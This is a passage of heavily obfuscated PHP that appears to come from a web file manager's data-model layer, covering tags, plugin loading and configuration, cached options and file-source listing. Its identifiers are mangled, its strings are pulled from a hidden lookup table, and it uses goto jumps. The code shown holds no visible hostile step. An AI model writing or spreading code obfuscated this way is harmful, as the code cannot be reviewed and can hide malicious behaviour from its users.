$_SERVER[™»È’øè]; if ($†ÖÊ‚‹Å && !is_array($†ÖÊ‚‹Å)) { $†ÖÊ‚‹Å = array($†ÖÊ‚‹Å); } $™âöÆ”ƒ = $this->listData($Ê™‰Ù¯); $ß£ßÚğÜ = array(); foreach ($™âöÆ”ƒ as $œ¤¬Éßş) { $Óû¼şÊš = $œ¤¬Éßş[$Ã·¨Ÿ§¸[84]]; if (!$Óû¼şÊš) { continue; } if (!isset($ß£ßÚğÜ[$Óû¼şÊš])) { $ß£ßÚğÜ[$Óû¼şÊš] = array(); } $ß£ßÚğÜ[$Óû¼şÊš][] = $œ¤¬Éßş[$Ã·¨Ÿ§¸[467]]; } $ÔÈÒ†Çâ = array(); foreach ($ß£ßÚğÜ as $è“¥§¬ => $ü†êÒÁ‚) { $ÌÙË = !0; if (!$†ÖÊ‚‹Å) { $ÔÈÒ†Çâ[] = $è“¥§¬; continue; } foreach ($†ÖÊ‚‹Å as $€Èóòó¥) { if (!in_array($€Èóòó¥, $ü†êÒÁ‚)) { $ÌÙË = !1; break; } } if ($ÌÙË) { $ÔÈÒ†Çâ[] = $è“¥§¬; } } if (!$ÔÈÒ†Çâ) { return array(); } $ÍèÄß¼† = array($Ã·¨Ÿ§¸[458] => array($Ã·¨Ÿ§¸[459], $ÔÈÒ†Çâ), $Ã·¨Ÿ§¸[537] => $Ê™‰Ù¯, $Ã·¨Ÿ§¸[177] => SourceModel::TYPE_GROUP); $˜úÄ¨«ê = Model($Ã·¨Ÿ§¸[1362])->listSource($ÍèÄß¼†); if (!$˜úÄ¨«ê || count($ÔÈÒ†Çâ) == $˜úÄ¨«ê[$Ã·¨Ÿ§¸[409]][$Ã·¨Ÿ§¸[410]]) { return $˜úÄ¨«ê; } $ûÌÄ¸Æ¨ = array(); $şú½›¼× = array_to_keyvalue($˜úÄ¨«ê[$Ã·¨Ÿ§¸[82]], $Ã·¨Ÿ§¸[12], $Ã·¨Ÿ§¸[180]); $ÊƒÂ½®÷ = array_to_keyvalue($˜úÄ¨«ê[$Ã·¨Ÿ§¸[83]], $Ã·¨Ÿ§¸[12], $Ã·¨Ÿ§¸[180]); $¥é­ˆ² = array_merge($ÊƒÂ½®÷, $şú½›¼×); foreach ($ÔÈÒ†Çâ as $Óû¼şÊš) { if (!in_array($Óû¼şÊš, $¥é­ˆ²)) { $ûÌÄ¸Æ¨[] = $Óû¼şÊš; } } if ($ûÌÄ¸Æ¨) { $this->removeBySource($Ê™‰Ù¯, $ûÌÄ¸Æ¨); } return $˜úÄ¨«ê; } protected function listData($‡¦µ‰¤) { $Ó÷Ø¼ôô =& $_SERVER[™»È’øè]; $ŒÔ÷¾ÇŠ = array($Ó÷Ø¼ôô[1669] => 0, $Ó÷Ø¼ôô[524] => array($Ó÷Ø¼ôô[1985], 0), $Ó÷Ø¼ôô[463] => $Ó÷Ø¼ôô[1986] . $‡¦µ‰¤); $´ºË÷Ô‘ = $Ó÷Ø¼ôô[1987]; $êğ³Ê’ = $this->field($´ºË÷Ô‘)->where($ŒÔ÷¾ÇŠ)->order($Ó÷Ø¼ôô[1988])->select(); return $êğ³Ê’ ? $êğ³Ê’ : array(); } protected function addToTag($Î²·ÂÌô, $™‰¤‹²Á, $–ñ½™Ïô) { $úç™Ò£ =& $_SERVER[™»È’øè]; if (!$this->getByTagID($Î²·ÂÌô, $–ñ½™Ïô) || !$™‰¤‹²Á) { return !1; } if (!Model($úç™Ò£[850])->pathInfo($™‰¤‹²Á)) { return !1; } $ĞÔ€’¾ = array($úç™Ò£[1669] => 0, $úç™Ò£[524] => $–ñ½™Ïô, $úç™Ò£[462] => $™‰¤‹²Á, $úç™Ò£[463] => $úç™Ò£[1989] . $Î²·ÂÌô, $úç™Ò£[461] => $úç™Ò£[12], $úç™Ò£[1874] => 0); if ($this->where($ĞÔ€’¾)->find()) { return !1; } return $this->add($ĞÔ€’¾); } protected function removeFromTag($¤ ôïÂ, $éÒİÍìª, $ÆğÅçÇâ) { $ ¶¹ÕÃı =& $_SERVER[™»È’øè]; if (!$this->getByTagID($¤ ôïÂ, $ÆğÅçÇâ) || !$éÒİÍìª) { return !1; } if (is_array($éÒİÍìª)) { $éÒİÍìª = array($ ¶¹ÕÃı[7], $éÒİÍìª); } $ÓÉ¡ŠÆÆ = array($ ¶¹ÕÃı[1669] => 0, $ ¶¹ÕÃı[524] => $ÆğÅçÇâ, $ ¶¹ÕÃı[463] => $ ¶¹ÕÃı[1989] . $¤ ôïÂ, $ ¶¹ÕÃı[462] => $éÒİÍìª); return $this->where($ÓÉ¡ŠÆÆ)->delete(); } protected function removeByTag($‚Ÿ­æ¿, $Ï¢Á‰Ğˆ) { $Ì†òëö’ =& $_SERVER[™»È’øè]; if (!$this->getByTagID($‚Ÿ­æ¿, $Ï¢Á‰Ğˆ)) { return !1; } $å†Š‹ù” = array($Ì†òëö’[1669] => 0, $Ì†òëö’[524] => $Ï¢Á‰Ğˆ, $Ì†òëö’[463] => $Ì†òëö’[1989] . $‚Ÿ­æ¿); return $this->where($å†Š‹ù”)->delete(); } protected function removeBySource($ï¬¹ó°, $†™¢ŸÑ†) { $‡«‘ìÒê =& $_SERVER[™»È’øè]; if (!$ï¬¹ó° || !$†™¢ŸÑ†) { return !1; } if (is_array($†™¢ŸÑ†)) { $†™¢ŸÑ† = array($‡«‘ìÒê[7], $†™¢ŸÑ†); } $‘´ÒŸ¼Ì = array($‡«‘ìÒê[1669] => 0, $‡«‘ìÒê[462] => $†™¢ŸÑ†, $‡«‘ìÒê[524] => array($‡«‘ìÒê[1044], 0), $‡«‘ìÒê[463] => $‡«‘ìÒê[1989] . $ï¬¹ó°); return $this->where($‘´ÒŸ¼Ì)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\160\x6c\165\x67\151\x6e\114\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\163\164\x61\164\165\x73", "\x72\x65\x67\x69\145\163\x74", "\x63\x6f\156\146\x69\x67"); public function loadList($şÏ¬Úµá = false) { $»ëšµí» = array_to_keyvalue($this->listData(), $_SERVER[™»È’øè][32]); if ($şÏ¬Úµá) { return $»ëšµí»[$şÏ¬Úµá]; } return $»ëšµí»; } public function init() { $ôé­ÈÏš =& $_SERVER[™»È’øè]; Hook::trigger($ôé­ÈÏš[1990]); $İÆÍÍ‹Ë = $this->loadPluginList(); foreach ($İÆÍÍ‹Ë as $·ŞÍî¼¸ => $ÓÑÙ˜×) { $áğÎü¹ = $this->appAllow($·ŞÍî¼¸, $ÓÑÙ˜×); if (!$áğÎü¹) { continue; } foreach ($ÓÑÙ˜×[$ôé­ÈÏš[1991]] as $şô‚á½  => $Ù«•‹šú) { Hook::bind($şô‚á½ , $Ù«•‹šú); } } Hook::trigger($ôé­ÈÏš[1992]); Hook::trigger(ACTION); } public function appAllow($»Ğü·ğ, $Ï³öáú, $€êÛÌö‚ = true) { $š°”ÔŠ¦ =& $_SERVER[™»È’øè]; $Ş¾¯èò´ = PLUGIN_DIR . $»Ğü·ğ . $š°”ÔŠ¦[1993]; if (!is_array($Ï³öáú) || !is_array($Ï³öáú[$š°”ÔŠ¦[1991]]) || $Ï³öáú[$š°”ÔŠ¦[775]] != 1 || !is_file($Ş¾¯èò´)) { return !1; } if ($GLOBALS[$š°”ÔŠ¦[535]] == 1) { if ($GLOBALS[$š°”ÔŠ¦[6]][$š°”ÔŠ¦[1994]] || !$GLOBALS[$š°”ÔŠ¦[6]][$š°”ÔŠ¦[1995]]) { return !0; } $Š‰ˆü±æ = explode($š°”ÔŠ¦[50], strtolower($GLOBALS[$š°”ÔŠ¦[6]][$š°”ÔŠ¦[1995]])); return in_array(strtolower($»Ğü·ğ), $Š‰ˆü±æ) ? !1 : !0; } if ($€êÛÌö‚ && !Action($š°”ÔŠ¦[1996])->checkAuth($»Ğü·ğ)) { return !1; } return !0; } public function unInstall($Òõ­ôĞŸ) { $Œ’• ¨ª =& $_SERVER[™»È’øè]; $Îûõ«ÍÆ = $this->loadList($Òõ­ôĞŸ); if (file_exists(PLUGIN_DIR . $Òõ­ôĞŸ)) { Hook::apply($Òõ­ôĞŸ . $Œ’• ¨ª[1997]); } $this->remove($Îûõ«ÍÆ[$Œ’• ¨ª[442]]); } public function changeStatus($óÕ±›Ìª, $…Ò¶ªşª) { $Æ£ƒĞ´† =& $_SERVER[™»È’øè]; $Ä“šúïÍ = $this->loadList($óÕ±›Ìª); if ($…Ò¶ªşª) { Hook::apply($óÕ±›Ìª . $Æ£ƒĞ´†[1998]); } $this->update($Ä“šúïÍ[$Æ£ƒĞ´†[442]], array($Æ£ƒĞ´†[1999] => $…Ò¶ªşª)); } public function appRegist($Óì —™, $ÑñÃ¿ÄÄ) { $ú£¡Ù =& $_SERVER[™»È’øè]; $©ƒ…ã©Ô = $this->loadList($Óì —™); if ($©ƒ…ã©Ô) { $this->update($©ƒ…ã©Ô[$ú£¡Ù[442]], array($ú£¡Ù[1991] => $ÑñÃ¿ÄÄ)); } else { $»‚«õİÉ = array($ú£¡Ù[32] => $Óì —™, $ú£¡Ù[1991] => $ÑñÃ¿ÄÄ, $ú£¡Ù[775] => 0, $ú£¡Ù[6] => $this->getConfigDefault($Óì —™)); $this->insert($»‚«õİÉ); } } public function getConfigDefault($ŠùÆÍ¼) { $­„÷Ó =& $_SERVER[™»È’øè]; $ú×Ï×Üô = array(); $Ÿçí§˜ = $this->getPackageJson($ŠùÆÍ¼); if (!$Ÿçí§˜ && is_array($Ÿçí§˜[$­„÷Ó[2000]])) { return $ú×Ï×Üô; } foreach ($Ÿçí§˜[$­„÷Ó[2000]] as $šÓÂßÎÎ => $Ì›–Í) { if (!isset($Ì›–Í[$­„÷Ó[417]]) || isset($ú×Ï×Üô[$šÓÂßÎÎ])) { continue; } $ú×Ï×Üô[$šÓÂßÎÎ] = $Ì›–Í[$­„÷Ó[417]]; } return $ú×Ï×Üô; } public function getPackageJson($şÔè»é) { return Hook::apply($şÔè»é . $_SERVER[™»È’øè][2001]); } public function getConfig($§Í°•¤ê, $àöšĞ¦Í = false) { $ ˜Ã—Œ =& $_SERVER[™»È’øè]; $ñÈÔ»™‰ = array(); $ü°ôôüö = $this->loadList($§Í°•¤ê); if ($ü°ôôüö && is_array($ü°ôôüö[$ ˜Ã—Œ[6]])) { $ñÈÔ»™‰ = $ü°ôôüö[$ ˜Ã—Œ[6]]; } if (!$ñÈÔ»™‰ || $àöšĞ¦Í) { $ñÈÔ»™‰ = $this->getConfigDefault($§Í°•¤ê); } return $ñÈÔ»™‰; } public function setConfig($ÉšÀÙ£ù, $¹¯˜àı  = false) { $›Ì¬–Ü€ =& $_SERVER[™»È’øè]; $ëŸ¶›¶ = $this->loadList($ÉšÀÙ£ù); if (!$ëŸ¶›¶) { return !1; } $ñßÈ”‡ù = $ëŸ¶›¶[$›Ì¬–Ü€[6]]; if ($¹¯˜àı  == !1) { $ñßÈ”‡ù = array(); $¹¯˜àı  = $this->getConfigDefault($ÉšÀÙ£ù); } foreach ($¹¯˜àı  as $ŠøÜùà¸ => $ã™·ü¢Ğ) { $ñßÈ”‡ù[$ŠøÜùà¸] = is_string($ã™·ü¢Ğ) ? trim($ã™·ü¢Ğ) : $ã™·ü¢Ğ; } $this->update($ëŸ¶›¶[$›Ì¬–Ü€[442]], array($›Ì¬–Ü€[6] => $ñßÈ”‡ù)); } public function viewList() { $½”©™—Á =& $_SERVER[™»È’øè]; $½¨ÎÊûÜ = $this->loadList(); $this->pluginScan($½¨ÎÊûÜ); $½¨ÎÊûÜ = $this->loadPluginList(); $¢¨¸Ş²³ = array(); foreach ($½¨ÎÊûÜ as $Ïç«“Âƒ => $†É€½ù) { unset($†É€½ù[$½”©™—Á[1991]], $†É€½ù[$½”©™—Á[6]]); $²æˆÛé = PLUGIN_DIR . $†É€½ù[$½”©™—Á[32]] . $½”©™—Á[1993]; if (!is_file($²æˆÛé)) { continue; } $Õ»¥øÆ’ = Hook::apply($†É€½ù[$½”©™—Á[32]] . $½”©™—Á[2001]); if (is_array($Õ»¥øÆ’)) { $¢¨¸Ş²³[$Ïç«“Âƒ] = array_merge($†É€½ù, $Õ»¥øÆ’); } } return $¢¨¸Ş²³; } private function loadPluginList() { $§á¤‚ØÑ =& $_SERVER[™»È’øè]; $ğ¯¥ì÷ß = $this->loadList(); if (strtolower(MOD) == $§á¤‚ØÑ[2002]) { return $ğ¯¥ì÷ß; } $¤äÏµ†… = Hook::trigger($§á¤‚ØÑ[2003], $ğ¯¥ì÷ß); if ($ğ¯¥ì÷ß && !$¤äÏµ†…) { die; } return $¤äÏµ†… ? $¤äÏµ†… : $ğ¯¥ì÷ß; } private function pluginScan($—êœ¿¢) { $…ÚÇÏê˜ =& $_SERVER[™»È’øè]; recursion_dir(PLUGIN_DIR, $ÛÆÈ•¤”, $Ş•ù„ƒ, 0); foreach ($ÛÆÈ•¤” as $ÌÚµÑä) { $›‡“‚íß = get_path_this($ÌÚµÑä); if (isset($—êœ¿¢[$›‡“‚íß]) || !file_exists($ÌÚµÑä . $…ÚÇÏê˜[2004]) || !file_exists($ÌÚµÑä . $…ÚÇÏê˜[1993])) { continue; } Hook::apply($›‡“‚íß . $…ÚÇÏê˜[1998]); } } } goto BïÙ–”“™©; fØêÒ§Ğ“Ö: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($áÍî¦²ü = false, $µÔ‘ú½¯ = '', $å››Üøô = false) { $ô¶©©š =& $_SERVER[™»È’øè]; $ÜÍÄœö‘ = $this->cacheGet($µÔ‘ú½¯); $áÃë¿ë» = $this->optionDefault($µÔ‘ú½¯); $áÃë¿ë» = is_array($áÃë¿ë») ? $áÃë¿ë» : array(); if (is_array($ÜÍÄœö‘)) { $ÜÍÄœö‘ = array_merge($áÃë¿ë», $ÜÍÄœö‘); return $áÍî¦²ü ? isset($ÜÍÄœö‘[$áÍî¦²ü]) ? $ÜÍÄœö‘[$áÍî¦²ü] : null : $ÜÍÄœö‘; } $“çı™Ú¼ = $this->filterWhere(array($ô¶©©š[33] => $µÔ‘ú½¯)); $ÜÍÄœö‘ = $this->where($“çı™Ú¼)->select(); $ÜÍÄœö‘ = array_to_keyvalue($ÜÍÄœö‘, $ô¶©©š[94], $ô¶©©š[417]); foreach ($ÜÍÄœö‘ as $ìÊ—·Ï => $ìüøÚ¿¸) { if ($å››Üøô || in_array($ìÊ—·Ï, $this->jsonField)) { $ÜÍÄœö‘[$ìÊ—·Ï] = json_decode($ìüøÚ¿¸, !0); } } $this->cacheSet($µÔ‘ú½¯, $ÜÍÄœö‘); $ÜÍÄœö‘ = array_merge($áÃë¿ë», $ÜÍÄœö‘); return $áÍî¦²ü ? $ÜÍÄœö‘[$áÍî¦²ü] : $ÜÍÄœö‘; } public function set($´¥²€ƒÊ, $¥ îÊ‰¨ = false, $èÈå¬éñ = '') { $¹Œ‰Ò—€ =& $_SERVER[™»È’øè]; $this->cacheRemove($èÈå¬éñ); $ÄÉÙ¸øç = array(); $×£’·à© = is_array($´¥²€ƒÊ) ? $´¥²€ƒÊ : array($´¥²€ƒÊ => $¥ îÊ‰¨); foreach ($×£’·à© as $•îØ«Šì => $ÌÕ±£”) { if (is_array($ÌÕ±£”)) { $ÌÕ±£” = json_encode_force($ÌÕ±£”); } $this->checkLength($ÌÕ±£”, !1, $this->tableName . $¹Œ‰Ò—€[4] . $´¥²€ƒÊ); $ÌÕ±£” = self::textEncode($ÌÕ±£”); $×£’·à© = array($¹Œ‰Ò—€[33] => $èÈå¬éñ, $¹Œ‰Ò—€[94] => $•îØ«Šì, $¹Œ‰Ò—€[417] => $ÌÕ±£”); $ÄÉÙ¸øç[] = $this->filterWhere($×£’·à©); } if (!$ÄÉÙ¸øç) { return !0; } $ôÊ±»³û = $this->cacheKey($¹Œ‰Ò—€[443]); CacheLock::lock($ôÊ±»³û); $ÔÄä½óÌ = $this->addAll($ÄÉÙ¸øç, array(), !0); CacheLock::unlock($ôÊ±»³û); return $ÔÄä½óÌ; } protected function optionDefault($ŸåÖÆµ = '') { return !1; } public function setDeep($ø×â˜ä, $Û’Î£ªø = false, $àßæ©Õ = '') { $ˆú¹•¿ô = explode($_SERVER[™»È’øè][10], $ø×â˜ä); $ä¤»¹©· = $this->get(); array_set_value($ä¤»¹©·, $ø×â˜ä, $Û’Î£ªø); $this->set($ˆú¹•¿ô[0], $ä¤»¹©·[$ˆú¹•¿ô[0]], $àßæ©Õ); } public function remove($äÔßÎÎ´, $Ş™š×èÜ = '') { $ª“ üÛ² =& $_SERVER[™»È’øè]; $this->cacheRemove($Ş™š×èÜ); $ï©ØäŠÄ = $this->filterWhere(array($ª“ üÛ²[94] => $äÔßÎÎ´, $ª“ üÛ²[33] => $Ş™š×èÜ)); if (is_null($äÔßÎÎ´)) { unset($ï©ØäŠÄ[$ª“ üÛ²[94]]); } return $this->where($ï©ØäŠÄ)->delete(); } public function cacheSet($îß®ÛØé, $¦š›Ïª = false) { return Cache::set($this->cacheKey($îß®ÛØé), $¦š›Ïª); } public function cacheGet($´À´Ò¿) { return Cache::get($this->cacheKey($´À´Ò¿)); } public function cacheRemove($½¬ŒûÇ’) { return Cache::remove($this->cacheKey($½¬ŒûÇ’)); } protected function filterWhere($Í ·À·ş) { return $Í ·À·ş; } protected function cacheKey($ğìÌš¨Æ) { return $ğìÌš¨Æ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\x6d\145" => "\x69\157\137\x73\x6f\x75\162\x63\x65\x5f\x6d\x65\x74\141", "\x6d\145\164\x61\x46\151\x65\154\144" => "\x73\157\165\162\x63\145\x49\x44"); protected $dataAuto = array(array("\x6d\157\144\151\146\x79\124\x69\155\145", "\x74\x69\155\x65", "\151\156\163\145\162\164", "\146\165\156\x63\164\x69\x6f\x6e"), array("\x63\x72\145\x61\x74\x65\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\x6e\163\x65\162\164", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\x76\x69\x65\167\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\163\145\x72\x74", "\146\x75\156\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ŠÀ©ùúá) { return $this->listSource(array($_SERVER[™»È’øè][444] => $ŠÀ©ùúá)); } public function typeName($é‹—ˆéè) { static $Ş¿©¡è = array(self::TYPE_SYSTEM => "\163\171\x73\x74\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\165\160"); return $Ş¿©¡è[$é‹—ˆéè . $_SERVER[™»È’øè][12]]; } public function sourceListInfo($Õ×öæ, $ªíõŸÌ = false) { $×–ˆª—— =& $_SERVER[™»È’øè]; $Õ×öæ = $Õ×öæ ? $Õ×öæ : array(); $Õ×öæ = array_filter(array_unique($Õ×öæ)); if (!$Õ×öæ) { return array(); } $¡´¾çèË = $this->where(array($×–ˆª——[180] => array($×–ˆª——[7], $Õ×öæ)))->select(); $this->_listDataApply($¡´¾çèË, $ªíõŸÌ); return array_to_keyvalue($¡´¾çèË, $×–ˆª——[180]); } public function pathInfoFilter(&$ùÑ½òıÙ) { $³ÕÑ¯‘’ =& $_SERVER[™»È’øè]; static $ÑğÊÙ¨¶ = false; static $æÛ’°İ = false; static $üÅÉ®ü› = false; if (!$ÑğÊÙ¨¶) { $”¶âŠÖ¢ = $³ÕÑ¯‘’[445]; $”¶âŠÖ¢ .= $³ÕÑ¯‘’[446]; $”¶âŠÖ¢ .= $³ÕÑ¯‘’[447]; $õå™ŠÃú = $³ÕÑ¯‘’[448]; $¥ËÔ¬øó = explode($³ÕÑ¯‘’[50], $õå™ŠÃú); $ÑğÊÙ¨¶ = explode($³ÕÑ¯‘’[50], $”¶âŠÖ¢); $æÛ’°İ = array(); foreach ($ÑğÊÙ¨¶ as $„åí­Í) { if (in_array($„åí­Í, $¥ËÔ¬øó)) { continue; } $æÛ’°İ[] = $„åí­Í; } $üÅÉ®ü› = explode($³ÕÑ¯‘’[50], $³ÕÑ¯‘’[449]); } foreach ($üÅÉ®ü› as $÷±Á¬£ë) { if (isset($ùÑ½òıÙ[$÷±Á¬£ë])) { $ùÑ½òıÙ[$÷±Á¬£ë] = intval($ùÑ½òıÙ[$÷±Á¬£ë]); } } $ùÑ½òıÙ[$³ÕÑ¯‘’[84]] = $³ÕÑ¯‘’[450] . $ùÑ½òıÙ[$³ÕÑ¯‘’[180]] . $³ÕÑ¯‘’[451]; $ùÑ½òıÙ[$³ÕÑ¯‘’[33]] = $ùÑ½òıÙ[$³ÕÑ¯‘’[452]] == 1 ? $³ÕÑ¯‘’[75] : $³ÕÑ¯‘’[213]; $ùÑ½òıÙ[$³ÕÑ¯‘’[177]] = $this->typeName($ùÑ½òıÙ[$³ÕÑ¯‘’[177]]); if ($ùÑ½òıÙ[$³ÕÑ¯‘’[452]] != 1) { $ùÑ½òıÙ[$³ÕÑ¯‘’[174]] = $ùÑ½òıÙ[$³ÕÑ¯‘’[453]]; unset($ùÑ½òıÙ[$³ÕÑ¯‘’[453]]); } $…Õù†áÃ = $ÑğÊÙ¨¶; if (isset($ùÑ½òıÙ[$³ÕÑ¯‘’[454]]) && $ùÑ½òıÙ[$³ÕÑ¯‘’[454]][$³ÕÑ¯‘’[455]] == -1) { $…Õù†áÃ = $æÛ’°İ; } $ùÑ½òıÙ = array_field_key($ùÑ½òıÙ, $…Õù†áÃ); return $ùÑ½òıÙ; } public function listUserFav() { $µÚœÚÑÜ =& $_SERVER[™»È’øè]; $Ô˜üŒç£ = Model($µÚœÚÑÜ[456])->listData(); $šã§ÚÏ = array_filter_by_field($Ô˜üŒç£, $µÚœÚÑÜ[33], $µÚœÚÑÜ[457]); $šã§ÚÏ = array_to_keyvalue($šã§ÚÏ, $µÚœÚÑÜ[12], $µÚœÚÑÜ[84]); if ($šã§ÚÏ) { $Ñ¸ÔÏ = $this->listSource(array($µÚœÚÑÜ[458] => array($µÚœÚÑÜ[459], $šã§ÚÏ))); } $Ñ¸ÔÏ = array_to_keyvalue($Ñ¸ÔÏ[$µÚœÚÑÜ[412]], $µÚœÚÑÜ[180]); foreach ($Ô˜üŒç£ as &$¬™ÜÅ¡¥) { $¬™ÜÅ¡¥ = array($µÚœÚÑÜ[460] => $¬™ÜÅ¡¥[$µÚœÚÑÜ[442]], $µÚœÚÑÜ[461] => $¬™ÜÅ¡¥[$µÚœÚÑÜ[32]], $µÚœÚÑÜ[462] => $¬™ÜÅ¡¥[$µÚœÚÑÜ[84]], $µÚœÚÑÜ[463] => $¬™ÜÅ¡¥[$µÚœÚÑÜ[33]], $µÚœÚÑÜ[464] => $¬™ÜÅ¡¥[$µÚœÚÑÜ[214]], $µÚœÚÑÜ[465] => $¬™ÜÅ¡¥[$µÚœÚÑÜ[85]]); if ($¬™ÜÅ¡¥[$µÚœÚÑÜ[33]] == $µÚœÚÑÜ[457] && $Ñ¸ÔÏ[$¬™ÜÅ¡¥[$µÚœÚÑÜ[84]]]) { $¬™ÜÅ¡¥[$µÚœÚÑÜ[87]] = $Ñ¸ÔÏ[$¬™ÜÅ¡¥[$µÚœÚÑÜ[84]]]; } } unset($¬™ÜÅ¡¥); return $Ô˜üŒç£; } public function listUserTag($öäÊê•Í) { $‰¢ÉçÅß =& $_SERVER[™»È’øè]; if ($öäÊê•Í && !is_array($öäÊê•Í)) { $öäÊê•Í = array($öäÊê•Í); } $ËÕÖ¤£¤ = Model($‰¢ÉçÅß[466])->listData(); $®•µ‹µ§ = array(); $ÇŒì½ñƒ = array(); foreach ($ËÕÖ¤£¤ as $÷Ç¨–’ş) { $óöÓ¹é = $÷Ç¨–’ş[$‰¢ÉçÅß[84]]; if (!$óöÓ¹é) { continue; } if (!isset($ÇŒì½ñƒ[$óöÓ¹é])) { $ÇŒì½ñƒ[$óöÓ¹é] = array(); } $ÇŒì½ñƒ[$óöÓ¹é][] = $÷Ç¨–’ş[$‰¢ÉçÅß[467]]; $®•µ‹µ§[$÷Ç¨–’ş[$‰¢ÉçÅß[84]]] = $÷Ç¨–’ş; } $ô”Äåğ’ = array(); $ÈÕåÂ­Í = array(); $—°èŠ•‘ = array(); foreach ($ÇŒì½ñƒ as $ïçÕæûØ => $•¤İæÇË) { $½¶Öâ¾‡ = !0; if (!$öäÊê•Í) { $ô”Äåğ’[] = $ïçÕæûØ; continue; } foreach ($öäÊê•Í as $¿ò…®¸) { if (!in_array($¿ò…®¸, $•¤İæÇË)) { $½¶Öâ¾‡ = !1; break; } } if (!$½¶Öâ¾‡) { continue; } if (!is_numeric($ïçÕæûØ)) { $æƒõ¾–ù = $®•µ‹µ§[$ïçÕæûØ]; $ÍëÕë¿ = array($‰¢ÉçÅß[32] => $æƒõ¾–ù[$‰¢ÉçÅß[32]], $‰¢ÉçÅß[84] => $æƒõ¾–ù[$‰¢ÉçÅß[84]], $‰¢ÉçÅß[33] => $æƒõ¾–ù[$‰¢ÉçÅß[33]], $‰¢ÉçÅß[87] => array($‰¢ÉçÅß[468] => 1), $‰¢ÉçÅß[215] => !0); if ($æƒõ¾–ù[$‰¢ÉçÅß[33]] == $‰¢ÉçÅß[213]) { $—°èŠ•‘[] = $ÍëÕë¿; } if ($æƒõ¾–ù[$‰¢ÉçÅß[33]] == $‰¢ÉçÅß[75]) { $ÈÕåÂ­Í[] = $ÍëÕë¿; } continue; } $ô”Äåğ’[] = $ïçÕæûØ; } if ($ô”Äåğ’) { $İØ¬œÅ² = $this->listSource(array($‰¢ÉçÅß[458] => array($‰¢ÉçÅß[459], $ô”Äåğ’))); } $İØ¬œÅ² = $İØ¬œÅ² ? $İØ¬œÅ² : array($‰¢ÉçÅß[82] => array(), $‰¢ÉçÅß[83] => array()); $İØ¬œÅ²[$‰¢ÉçÅß[82]] = array_merge($İØ¬œÅ²[$‰¢ÉçÅß[82]], $ÈÕåÂ­Í); $İØ¬œÅ²[$‰¢ÉçÅß[83]] = array_merge($İØ¬œÅ²[$‰¢ÉçÅß[83]], $—°èŠ•‘); if (isset($İØ¬œÅ²[$‰¢ÉçÅß[409]]) && count($ô”Äåğ’) == $İØ¬œÅ²[$‰¢ÉçÅß[409]][$‰¢ÉçÅß[410]]) { return $İØ¬œÅ²; } $õÎ±ÌÖó = array(); $ÜòÏ¶²î = array_to_keyvalue($İØ¬œÅ²[$‰¢ÉçÅß[82]], $‰¢ÉçÅß[12], $‰¢ÉçÅß[180]); $î™—šõ = array_to_keyvalue($İØ¬œÅ²[$‰¢ÉçÅß[83]], $‰¢ÉçÅß[12], $‰¢ÉçÅß[180]); $—¦Ö«’ = array_merge($î™—šõ, $ÜòÏ¶²î); foreach ($ô”Äåğ’ as $óöÓ¹é) { if (!in_array($óöÓ¹é, $—¦Ö«’)) { $õÎ±ÌÖó[] = $óöÓ¹é; } } if ($õÎ±ÌÖó) { Model($‰¢ÉçÅß[469])->removeBySource($õÎ±ÌÖó); } return $İØ¬œÅ²; } public function listUserRecycle() { $ˆ±®şŸ´ =& $_SERVER[™»È’øè]; $¼®™°  = Model($ˆ±®şŸ´[470])->listData(); if (!$¼®™° ) { return array(); } $‡±©ÅÚˆ = array($ˆ±®şŸ´[458] => array($ˆ±®şŸ´[459], $¼®™° ), $ˆ±®şŸ´[471] => 1); return $this->listSource($‡±©ÅÚˆ); } public function listSource($×„ˆü‰â, $¨¥Ç†öÑ = 3000, $’ÔèŒı = false) { $È¤º¦û² =& $_SERVER[™»È’øè]; if (!isset($×„ˆü‰â[$È¤º¦û²[472]])) { $×„ˆü‰â[$È¤º¦û²[472]] = 0; } if (isset($×„ˆü‰â[$È¤º¦û²[179]]) && $×„ˆü‰â[$È¤º¦û²[179]] == $È¤º¦û²[211]) { $×„ˆü‰â[$È¤º¦û²[453]] = array($È¤º¦û²[374], $È¤º¦û²[473]); } $´‹á£ß³ = $È¤º¦û²[474]; $İóÊÈÂÏ = $this->field($´‹á£ß³)->_makeOrder()->where($×„ˆü‰â)->selectPage($¨¥Ç†öÑ); $this->_listPageCheck($İóÊÈÂÏ, $´‹á£ß³, $×„ˆü‰â); $this->_listDataApply($İóÊÈÂÏ[$È¤º¦û²[412]], $’ÔèŒı); $this->_listMake($İóÊÈÂÏ); return $İóÊÈÂÏ; } private function _listPageCheck(&$äúÜãš, $……ïï™, $›Šêü¥Í) { $Úë¿¥¢Š =& $_SERVER[™»È’øè]; if (!is_array($äúÜãš[$Úë¿¥¢Š[409]])) { return; } $‚©ÇÑªû = $äúÜãš[$Úë¿¥¢Š[409]]; if ($‚©ÇÑªû[$Úë¿¥¢Š[411]] <= 1) { return; } if ($‚©ÇÑªû[$Úë¿¥¢Š[410]] >= 100000) { return; } if (Model($Úë¿¥¢Š[475])->get($Úë¿¥¢Š[476]) != $Úë¿¥¢Š[477]) { return; } $……ïï™ = str_replace(array($Úë¿¥¢Š[53], $Úë¿¥¢Š[385], $Úë¿¥¢Š[245]), $Úë¿¥¢Š[12], $……ïï™); $……ïï™ = $Úë¿¥¢Š[478] . str_replace($Úë¿¥¢Š[50], $Úë¿¥¢Š[479], $……ïï™) . $Úë¿¥¢Š[480]; $ãôÇîÛ = $Úë¿¥¢Š[481]; $ãôÇîÛ = $ãôÇîÛ . $Úë¿¥¢Š[482]; $ˆ¦ßüş‰ = $‚©ÇÑªû[$Úë¿¥¢Š[406]] * ($‚©ÇÑªû[$Úë¿¥¢Š[396]] - 1) . $Úë¿¥¢Š[50] . $‚©ÇÑªû[$Úë¿¥¢Š[406]]; 